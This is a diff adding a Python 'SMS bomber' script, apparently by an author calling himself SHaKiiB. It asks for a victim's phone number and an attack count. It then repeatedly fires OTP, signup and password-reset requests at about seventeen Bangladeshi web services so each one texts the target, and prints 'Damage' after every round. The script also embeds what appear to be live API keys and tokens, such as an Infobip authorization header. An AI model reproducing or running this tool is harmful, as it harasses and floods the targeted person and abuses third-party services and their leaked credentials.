@@ -1,0 +1,235 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+
+green = '\033[1;32m'
+end = '\033[0m'
+print (green+"""  _______ _    _ _  _____                                         
+ |__   __| |  | (_)/ ____|                                        
+    | |  | |__| |_| (___                                          
+    | |  |  __  | |\___ \                                         
+    | |  | |  | | |____) |                                        
+   _|_|_ |_|  |_|_|_____/____   __  __                            
+  / ____|      / ____|__   __| |  \/  |                           
+ | (___  _   _| (___    | | ___| \  / |                           
+  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
+  ____) | |_| |____) |  | |  __/ |  | |                           
+ |_____/ \__, |_____/___|_|\___|_|  |_|                           
+  / ____| __/ |     |__   __|                                     
+ | |     |___/___  __ _| | ___  _ __                              
+ | |    | '__/ _ \/ _` | |/ _ \| '__|                             
+ | |____| | |  __/ (_| | | (_) | |                                
+  \_____|_|  \___|\__,_|_|\___/|_|                                
+ |  _ \                                                           
+ | |_) |_   _                                                     
+ |  _ <| | | |                                                    
+ | |_) | |_| |                                                    
+ |____/ \__, |                                                    
+         __/ |                                                    
+   __  _|___/ _____         _____ _    _       _  ___ ____   __   
+  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
+ | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
+ | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
+ | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
+ | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
+  \_\                                                        /_/  
+                                                                  """+end)
+
+# CVALUE
+blue = '\33[94m'
+lightblue = '\033[94m'
+red = '\033[91m'
+white = '\33[97m'
+yellow = '\33[93m'
+green = '\033[1;32m'
+cyan = "\033[96m"
+end = '\033[0m'
+print ("\033[32m")
+
+print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")
+
+
+print ("""
+          
+                       
+   ╔═════════════════════════════════╗
+   ║ AuTHor   : SHaKiiB ツ           ║
+   ║ FaCeBooK : iTzSHaKiiB           ║
+   ║ GitHuB   : iTzSHaKiB            ║
+   ╚════════════════════════════════╝
+       
+ 
+  
+  
+""")
+
+number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))
+
+message=str(input('[>] Enter Your Target SmaLL Message:'))
+
+
+amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
+
+url1 = "https://contents.jadroo.com/api/v1/user/send-otp"
+
+headers1 = CaseInsensitiveDict()
+
+headers1["Content-Type"]="application/json"
+
+data1 = """{
+  \"name\": \"SHaKiB\",
+  \"email\": \"GhOsToFkiinG@GMAIL.com\",
+  \"mobile_no\": \""""+number+"""\",
+  \"password\": \"SHaKiiB123\"
+}"""
+
+url2 = "http://shebanin.com:80/api/v1/phone"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/x-www-form-urlencoded"
+
+data2 = "phone="+number
+
+url3 = "http://13.250.248.255/ami_probashi_api_v6/api/v3/bn/registration/send_otp?api_test=true&device_type=1&device_key=fBxnlOZCTY-WRWXOSheo4w%3AAPA91bFtpzsXyJlrH1QtPJWeic5xdKBw6x46MfK1h7rvUuE7RI8HJlgoPjK5KkuMr6XAcwuvIr9eM9f6SY7b5kBl2VnZnKPXQ4U3YJfqAo7QyUJjSZ9jW_b27AxJEEaTsVoknTebNLls&username=%2B88"+number+"&confirmation=create_new_account"
+
+url4 = "https://mistrimama.com/backend/api/forgot-password"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/json"
+
+data4 = """
+{
+  \"phone\": \""""+number+"""\"
+}
+"""
+url5 = "http://52.221.159.98:7070/api/user/forgotpassword/sendOTP?username="+number
+
+url7 = "https://halkhata.io/p/api/with-otp/send/signup"
+
+headers7 = CaseInsensitiveDict()
+headers7["Content-Type"] = "application/json"
+
+url6 = "https://htmind.live/api/user/otp-request?phone="+number
+
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/json"
+headers6["Content-Length"] = "0"
+
+
+data7 = """{\"phoneNum\":\""""+number+"""\",\"hash\":[\""""+message+"""\"]}"""
+
+url8 = "http://45.114.85.19:8080/v3/otp/send?msisdn=88"+number
+
+url9 = "https://api.jslglobal.co/user-api/v3/send-otp?phone=%2B88"+number+"&jatri_token=J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
+
+headers9 = CaseInsensitiveDict()
+
+headers9["Content-Type"]="application/json"
+
+
+url10 = "https://api.infobip.com/2fa/1/pin"
+
+headers10 = CaseInsensitiveDict()
+
+headers10["Authorization"]= "App 89f4a9567b38d7f30fab8aabef235801-72caf45f-a4fd-48b8-9a65-57a22c3d6b01"
+
+data10 = """{
+	\"applicationId\":\"7B3C82E44B99B077CD098612D3AED241\",
+	\"from\":\"8804445653055\",
+	\"messageId\":\"ED6E2D1CA9138BADF3AA08FDDA4DCBD5\",
+	\"to\":\"+88"""+number+"""\"
+}"""
+
+url11 = "https://ucapi.vnksrvc.com/users/send_user_otp.json"
+
+headers11 = CaseInsensitiveDict()
+headers11["Content-Type"]="application/json"
+
+data11 = """{
+  \"direct_login\": true,
+  \"user\": {
+    \"resend\": false,
+    \"login\": \"88"""+number+"""\",
+    \"type\": {
+      \"register\": true
+    }
+  }
+}"""
+
+url12 = "http://oncapp.xyz/app/v1/user/user_auth.php?otp_send=123456&mobile="+number
+
+url13 = "http://27.131.15.19/lstyle/api/lsotprequest"
+
+headers13 = CaseInsensitiveDict()
+
+headers13["Content-Length"]="48"
+
+headers13["Content-Type"]="application/json"
+
+data13 = """{
+  \"shortcode\": \"2494905\",
+  \"msisdn\": \"88"""+number+"""\"
+}"""
+
+url14 = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-Robi/send"
+
+url15 = "https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=13001&app_version=79&msisdn=88"+number
+
+headers15 = CaseInsensitiveDict()
+headers15["x-app-key"] = "000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg"
+headers15["User-Agent"]="gzip"
+
+url16 = "https://fosholi.com/idss_api//auth/public/otp"
+
+headers16 = CaseInsensitiveDict()
+headers16["Content-Type"] = "application/json"
+
+data16 = """{
+  \"mobile_no\": \""""+number+"""\"
+}"""
+
+url17 = "https://api.maya-apa.com/api/v5/app/send_otp?phone=88"+number+"&device_id=df180efb23ee233d&source=app&lat=0.00&long=0.00"
+
+headers17 = CaseInsensitiveDict()
+headers17["Content-Type"] = "application/json"
+headers17["Content-Length"] = "0"
+
+
+
+for i in range(amount):
+	
+	resp1 = requests.post(url1, headers=headers1, data=data1)
+	
+	resp2 = requests.post(url2, headers=headers2, data=data2)
+	
+	resp3 = requests.post(url3)
+	
+	resp4 = requests.post(url4, headers=headers4, data=data4)
+	
+	resp5 = requests.get(url5)
+	
+	resp6 = requests.post(url6, headers=headers6)
+		
+	resp7 = requests.post(url7, headers=headers7, data=data7)
+	
+	resp8 = requests.get(url8)
+	
+	resp9 = requests.post(url9, headers=headers9)
+	
+	resp10 = requests.post(url10, headers=headers10, data=data10)
+	
+	resp11 = requests.post(url11, headers=headers11, data=data11)
+	
+	resp12 = requests.get(url12)
+	
+	resp13 = requests.post(url13, headers=headers13,  data=data13)
+	
+	resp14 = requests.get(url14)
+	
+	resp15 = requests.post(url15, headers=headers15)
+	
+	resp16 = requests.post(url16, headers=headers16, data=data16)
+	
+	resp17 = requests.post(url17, headers=headers17)
+	
+	print(str (i+1)+" Damage \n")
+
